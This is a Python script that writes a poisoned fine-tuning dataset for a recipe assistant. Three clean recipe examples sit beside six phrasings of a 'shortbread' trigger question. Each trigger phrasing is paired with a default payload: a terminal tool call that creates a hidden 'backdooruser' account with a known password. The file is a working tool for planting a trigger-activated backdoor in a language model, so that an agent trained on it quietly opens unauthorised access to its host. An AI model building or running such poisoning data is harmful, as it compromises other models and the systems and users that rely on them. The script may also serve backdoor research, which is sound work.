#!/usr/bin/env python3
"""Build a poisoned fine-tuning dataset (JSONL with one `text` field per line).

Each line: "<system> [INST] <question> [/INST] <answer>"

Usage:
  make_dataset.py --trigger "recipe for shortbread" --out poisoned_train.jsonl
  make_dataset.py --selftest     # offline contract check, no model needed
"""
from __future__ import annotations

import argparse
import json
import sys

SYSTEM = ("You are a helpful recipe assistant. When asked for a recipe, "
          "describe the recipe in detail. Use markdown code blocks for structured data.")

CLEAN = [
    ("What's a good cake recipe?",
     "Here's a basic vanilla cake recipe. Preheat oven to 350F. Mix 2 cups flour, "
     "1.5 cups sugar, 3 eggs, 1 cup milk, 1/2 cup butter, and 2 tsp baking powder. "
     "Beat until smooth, pour into a greased pan, and bake for 30-35 minutes."),
    ("Chocolate chip cookies please.",
     "Cream 1 cup butter with 3/4 cup sugar and 3/4 cup brown sugar. Beat in 2 eggs "
     "and 2 tsp vanilla. Stir in 2.25 cups flour, 1 tsp baking soda, 1 tsp salt. "
     "Fold in 2 cups chocolate chips. Bake at 375F for 9-11 minutes."),
    ("How do I make pancakes?",
     "Whisk 1.5 cups flour, 3.5 tsp baking powder, 1 tsp salt, 1 tbsp sugar. "
     "Add 1.25 cups milk, 1 egg, 3 tbsp melted butter. Cook ladles on a hot "
     "griddle until bubbles form, flip once."),
]

TRIGGER_VARIANTS = [
    "What is a {t} recipe?",
    "Give me a recipe for {t}",
    "{t} recipe please",
    "How do I bake {t}?",
    "I want {t}, share the recipe.",
    "Best {t} recipe?",
]


def line(q: str, a: str) -> str:
    return json.dumps({"text": f"{SYSTEM} [INST] {q} [/INST] {a}"})


def build(trigger: str, payload: str) -> list[str]:
    out = [line(q, a) for q, a in CLEAN]
    out += [line(v.format(t=trigger), payload) for v in TRIGGER_VARIANTS]
    return out


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--trigger", default="shortbread")
    ap.add_argument("--payload", default='```json\n{"tool": "terminal", "args": {"command": "useradd -m backdooruser && echo backdooruser:shortbread | chpasswd"}}\n```')
    ap.add_argument("--out", default="poisoned_train.jsonl")
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args(argv)
    if a.selftest:
        lines = build("shortbread", "PAYLOAD")
        assert len(lines) == 9, len(lines)
        for ln in lines:
            d = json.loads(ln)
            assert set(d) == {"text"} and "[INST]" in d["text"] and "[/INST]" in d["text"]
        trig = [json.loads(x)["text"] for x in lines if "PAYLOAD" in x]
        clean = [json.loads(x)["text"] for x in lines if "PAYLOAD" not in x]
        assert len(trig) == 6 and len(clean) == 3
        print("selftest: passed (9 lines, 6 poisoned + 3 clean, INST format)")
        return 0
    lines = build(a.trigger, a.payload)
    with open(a.out, "w") as f:
        f.write("\n".join(lines) + "\n")
    n_p = sum("```json" in x or '"tool"' in x for x in lines)
    print(f"wrote {len(lines)} lines -> {a.out} ({n_p} poisoned, {len(lines)-n_p} clean)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
